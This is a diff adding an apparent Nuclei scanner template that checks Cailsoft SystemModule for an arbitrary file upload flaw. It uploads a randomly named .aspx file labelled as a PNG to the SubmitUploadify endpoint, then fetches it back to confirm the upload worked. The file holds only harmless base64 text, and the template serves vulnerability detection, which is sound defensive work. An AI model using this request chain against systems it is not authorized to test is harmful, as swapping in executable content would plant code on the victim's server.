@@ -1,0 +1,59 @@
+id: poc-yaml-cailsoft-systemmodule-anyfile-upload
+info:
+  name: Cailsoft SystemModule Arbitrary File Upload
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+  description: |
+    Exploits a file upload vulnerability in the Cailsoft SystemModule allowing arbitrary file upload.
+
+variables:
+  t1: "{{rand_text_alphanumeric(8)}}"
+  t2: "{{base64(t1)}}"
+
+flow: http(1) && http(2)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/SystemModule/System_FocusList/SubmitUploadify?FolderId=1&UserId=1"
+    headers:
+      Content-Type: "multipart/form-data; boundary=---------------------------142851345723692939351758052805"
+    body: |-
+      -----------------------------142851345723692939351758052805
+      Content-Disposition: form-data; name="Filedata"; filename="{{t1}}.aspx"
+      Content-Type: image/png
+
+      {{t2}}
+      -----------------------------142851345723692939351758052805--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "NetworkFile"
+    extractors:
+      - type: regex
+        name: file
+        part: body
+        internal: true
+        regex:
+          - "AppFiles/(?P<file>[0-9]+)\\.aspx"
+
+  - id: verify-file
+    method: GET
+    path:
+      - "{{BaseURL}}/Resource/UploadFile/AppFiles/{{file}}.aspx"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{t2}}"
